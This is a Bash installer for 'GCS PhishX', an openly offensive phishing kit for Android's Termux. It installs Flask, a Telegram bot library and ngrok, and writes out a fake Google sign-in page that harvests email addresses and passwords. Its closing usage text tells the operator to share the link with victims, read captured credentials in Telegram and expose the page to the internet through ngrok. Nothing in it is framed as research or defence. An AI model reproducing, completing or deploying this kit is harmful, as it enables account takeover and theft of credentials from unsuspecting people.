#!/bin/bash
# PhishX Installation Script for Termux

echo "========================================"
echo "  GCS PHISHX - INSTALLATIONI SCRIPT     "
echo "========================================"

# Update packages
echo "[*] Updating packages..."
pkg update -y && pkg upgrade -y

# Install Python and required packages
echo "[*] Installing Python..."
pkg install python -y
pkg install python-pip -y

# Install dependencies
echo "[*] Installing Python dependencies..."
pip install flask requests python-telegram-bot

# Install ngrok for tunneling
echo "[*] Installing ngrok..."
pkg install wget -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
rm ngrok-stable-linux-arm.zip
chmod +x ngrok

# Create directories
echo "[*] Creating directories..."
mkdir -p templates static logs

# Create HTML templates
echo "[*] Creating HTML templates..."

# Create Google phishing page
cat > templates/google.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <style>
        /* Add your Google phishing page styles here */
        body { font-family: Arial, sans-serif; background: white; }
        .container { max-width: 450px; margin: 50px auto; padding: 40px; border: 1px solid #ddd; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" width="100">
        </div>
        <h2>Sign in</h2>
        <p>Use your Google Account</p>
        <form method="POST">
            <input type="email" name="email" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Enter your password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
EOF

# Create other templates similarly...
# (Add Facebook, Instagram, WhatsApp templates)

echo "[*] Installation complete!"
echo ""
echo "========================================"
echo "   HOW TO USE GCS PHISHX TOOL:"
echo "========================================"
echo "1. Run the tool: python phishx.py"
echo "2. Open browser: http://localhost:8080"
echo "3. Select phishing page"
echo "4. Share link with victims"
echo "5. Check Telegram for captured data"
echo ""
echo "To expose to internet: ./ngrok http 8080"
echo "========================================"

